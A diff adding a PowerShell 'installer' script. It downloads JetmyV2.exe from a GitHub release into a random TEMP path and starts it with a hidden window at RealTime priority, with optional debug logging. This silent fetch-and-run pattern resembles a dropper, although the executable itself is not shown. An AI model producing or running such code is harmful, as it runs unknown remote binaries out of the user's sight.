@@ -1,0 +1,71 @@
+$ErrorActionPreference = 'Stop'
+Set-StrictMode -Version Latest
+
+# Set to $true to show diagnostics. Leave $false for a silent installation.
+$Debug = $true
+
+function Write-InstallerLog {
+    param([string]$Message)
+
+    if ($Debug) {
+        Write-Host ('[installer] {0}' -f $Message)
+    }
+}
+
+$DownloadUrl = "https://github.com/enderhacker/JetmyV2/releases/latest/download/JetmyV2.exe"
+
+$webClient = $null
+$exitCode = 1
+$stage = 'initialization'
+try {
+    Write-InstallerLog ('PowerShell: {0}; .NET: {1}; Windows: {2}' -f $PSVersionTable.PSVersion, [Environment]::Version, [Environment]::OSVersion.VersionString)
+    Write-InstallerLog ('Process architecture: {0}; native architecture override: {1}' -f $env:PROCESSOR_ARCHITECTURE, $env:PROCESSOR_ARCHITEW6432)
+    $TempExePath = Join-Path $env:TEMP ([IO.Path]::ChangeExtension([IO.Path]::GetRandomFileName(), '.exe'))
+    Write-InstallerLog ('Temporary executable: {0}' -f $TempExePath)
+
+    $stage = 'TLS configuration'
+    try {
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        Write-InstallerLog 'TLS 1.2 enabled.'
+    } catch {
+        Write-InstallerLog ('Could not enable TLS 1.2; keeping system defaults: {0}' -f $_.Exception.Message)
+    }
+
+    $stage = 'download'
+    Write-InstallerLog ('Downloading: {0}' -f $DownloadUrl)
+    $webClient = New-Object System.Net.WebClient
+    $webClient.DownloadFile($DownloadUrl, $TempExePath)
+
+    $stage = 'download verification'
+    if (-not (Test-Path -LiteralPath $TempExePath -PathType Leaf)) {
+        throw 'The download did not create an executable file.'
+    }
+    $download = Get-Item -LiteralPath $TempExePath
+    Write-InstallerLog ('Downloaded {0} bytes.' -f $download.Length)
+
+    $stage = 'process launch'
+    Write-InstallerLog 'Starting downloaded executable (hidden); exiting PowerShell without waiting.'
+    Start-Process -FilePath $TempExePath -WindowStyle Hidden -Priority RealTime
+    $exitCode = 0
+}
+catch {
+    Write-InstallerLog ('Failed during {0}: {1}' -f $stage, $_.Exception.Message)
+    Write-InstallerLog ('Error ID: {0}; category: {1}' -f $_.FullyQualifiedErrorId, $_.CategoryInfo)
+    Write-InstallerLog ('Location: {0}' -f $_.InvocationInfo.PositionMessage)
+    $exception = $_.Exception.InnerException
+    while ($null -ne $exception) {
+        Write-InstallerLog ('Inner exception ({0}): {1}' -f $exception.GetType().FullName, $exception.Message)
+        $exception = $exception.InnerException
+    }
+}
+finally {
+    if ($null -ne $webClient) {
+        try {
+            $webClient.Dispose()
+        } catch {
+            Write-InstallerLog ('WebClient cleanup failed: {0}' -f $_.Exception.Message)
+        }
+    }
+}
+
+exit $exitCode
